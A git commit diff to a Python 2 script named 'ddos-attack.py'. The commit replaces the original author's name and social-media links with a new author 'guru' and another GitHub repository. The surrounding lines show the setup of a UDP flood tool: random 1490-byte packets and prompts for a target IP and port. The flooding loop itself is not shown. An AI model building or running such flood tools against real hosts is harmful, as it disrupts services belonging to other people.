a0ceb2378e4c3341bdc13d1ba377b9114b4100fa
Rajas Lashkare <38384331+whitehat-hacker-rajas@users.noreply.github.com>
2019-12-15 09:15:01 +0530

    Download master ddos

--- ddos-attack.py
+++ ddos-attack.py
@@ -20,10 +20,8 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : guru"
+print "github   : https://github.com/whitehat-hacker-rajas/d-ddos2.git"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
